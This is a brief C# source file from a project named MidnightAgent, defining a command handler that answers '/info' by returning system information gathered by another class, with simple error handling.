using System;
using System.Threading.Tasks;
using MidnightAgent.Core;

namespace MidnightAgent.Features
{
    public class SystemInfoFeature : IFeature
    {
        public string Command => "info";
        public string Description => "Get full system information";
        public string Usage => "/info";

        public Task<FeatureResult> ExecuteAsync(string[] args)
        {
            try
            {
                // Retrieve full consolidated info from AgentInfo class
                string info = AgentInfo.GetFullInfo();
                return Task.FromResult(FeatureResult.Ok(info));
            }
            catch (Exception ex)
            {
                 return Task.FromResult(FeatureResult.Fail($"Error retrieving info: {ex.Message}"));
            }
        }
    }
}
